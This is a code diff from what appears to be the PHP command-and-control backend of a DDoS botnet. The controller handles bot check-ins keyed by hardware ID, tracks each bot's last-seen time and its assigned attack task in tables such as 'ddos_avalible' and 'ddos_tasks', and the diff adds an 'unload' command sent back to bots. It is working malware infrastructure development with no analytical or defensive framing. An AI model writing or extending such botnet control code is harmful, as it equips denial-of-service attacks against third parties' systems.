@@ -10,14 +10,12 @@ class ddosHandlerController{
             $result = $statement->execute(array('botid' => $_POST["hwid"]));
             $user = $statement->fetch();
             if($user !== false) {
+                if($user["active"] == 2 && $user["lastseen"] >= time() - 5){
+                    echo "unload";
+                    die();
+                }
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET lastseen = ?, ddos_taskid = ?, active = ?  WHERE botid = ?");
                 $statement->execute(array(time(), $_POST["taskid"],  $_POST["taskrunning"],$_POST["hwid"]));
-                if(is_int(intval($_POST["taskrunning"]))){
-                    $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_tasks where id = ?");
-                    $statement->execute(array($_POST["taskrunning"]));
-                    $task = $statement->fetch();
-
-                }
             }else{
                 $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_avalible (botid, lastseen, ddos_taskid, active) VALUES (?, ?, ?, ?)");
                 $statement->execute(array($_POST["hwid"], time(), $_POST["taskid"], $_POST["taskrunning"]));
